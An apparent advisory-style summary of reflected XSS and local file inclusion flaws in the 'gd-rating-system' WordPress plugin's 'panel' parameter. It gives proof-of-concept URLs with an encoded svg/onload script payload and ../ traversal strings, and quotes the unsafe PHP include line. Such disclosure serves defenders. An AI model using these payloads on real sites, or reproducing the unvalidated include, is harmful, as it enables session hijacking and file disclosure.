The content provided describes multiple vulnerabilities, including Cross-Site Scripting (XSS) and Local File Inclusion (LFI) vulnerabilities, within the 'gd-rating-system' WordPress plugin.

**XSS Vulnerabilities:**

*   **Root Cause:** The plugin fails to properly sanitize user-supplied input passed via the `panel` parameter in multiple admin pages.
*   **Weaknesses/Vulnerabilities:** Unsanitized user input in the `panel` parameter, leading to reflected XSS.
*   **Impact of Exploitation:** An attacker can inject malicious JavaScript code that is executed in the victim's browser when they visit the vulnerable admin pages. This could lead to session hijacking, defacement of the website, or redirection to malicious websites.
*   **Attack Vectors:** Sending crafted URLs with malicious javascript in the `panel` parameter to the vulnerable admin pages.
*   **Required Attacker Capabilities/Position:** Attacker needs to trick an authenticated admin user into clicking a malicious link or accessing a malicious page.

The vulnerable URLs are as follows with their respective POC's:

    *   `http://localhost/wordpress/wp-admin/admin.php?page=gd-rating-system-information&panel=x`
        *   `panel=%27%22%3E%3Csvg%2Fonload%3Dconsole.log(%2Fxss%2F)%3E%3C%27%22`
    *   `http://localhost/wordpress/wp-admin/admin.php?page=gd-rating-system-about&panel=x`
        *   `panel=%27%22%3E%3Csvg%2Fonload%3Dconsole.log(%2Fxss2%2F)%3E%3C%27%22`
    *   `http://localhost/wordpress/wp-admin/admin.php?page=gd-rating-system-transfer&panel=x`
        *   `panel=%27%22%3E%3Csvg%2Fonload%3Dconsole.log(%2Fxss3%2F)%3E%3C%27%22`
    *   `http://localhost/wordpress/wp-admin/admin.php?page=gd-rating-system-tools&panel=x`
        *   `panel=%27%22%3E%3Csvg%2Fonload%3Dconsole.log(%2Fxss4%2F)%3E%3C%27%22`

**LFI Vulnerabilities:**

*   **Root Cause:** The plugin uses the `panel` parameter in the admin pages to include files without proper validation.
*   **Weaknesses/Vulnerabilities:** Lack of input validation for the `panel` parameter, allowing an attacker to include arbitrary files via directory traversal.
*   **Impact of Exploitation:** An attacker can include arbitrary files from the server, potentially including sensitive files (configuration files, source code). This can lead to disclosure of sensitive information.
*  **Attack Vectors:** Sending crafted URLs with directory traversal sequences (e.g., `..%2F`) in the `panel` parameter to the vulnerable admin pages.
*   **Required Attacker Capabilities/Position:** Attacker needs to trick an authenticated admin user into clicking a malicious link or accessing a malicious page.

The vulnerable URLs and weak files are as follows with their respective POC's:
    *   `http://localhost/wordpress/wp-admin/admin.php?page=gd-rating-system-information&panel=..%2F..%2F..%2F..%2F..%2F..%2Fphpinfo`
        *   Weak file: `/forms/information.php`
    *   `http://localhost/wordpress/wp-admin/admin.php?page=gd-rating-system-about&panel=..%2F..%2F..%2F..%2F..%2F..%2Fphpinfo`
        *   Weak file: `/forms/about.php`
    *   `http://localhost/wordpress/wp-admin/admin.php?page=gd-rating-system-transfer&panel=..%2F..%2F..%2F..%2F..%2F..%2Fphpinfo`
        *  Weak file: `/forms/transfer.php`
    *  `http://localhost/wordpress/wp-admin/admin.php?page=gd-rating-system-tools&panel=..%2F..%2F..%2F..%2F..%2F..%2Fphpinfo`
        *  Weak file: `/forms/tools.php`

The weak code for all of the LFI vulnerabilities is:

```php
include(GDRTS_PATH.'forms/panels/'.$_panel.'.php');
```

This code directly includes the file specified by the user-controlled `$_panel` variable, leading to the LFI vulnerability.

**Additional Information:**

The content provides more details than a typical CVE description. It includes specific vulnerable URLs, Proof-of-Concept (POC) payloads for both XSS and LFI, vulnerable files, and the snippet of vulnerable code related to LFI. It also mentions that the vulnerabilities were tested on WordPress 4.9.1 and the latest version of the 'gd-rating-system' plugin at the time of the report.
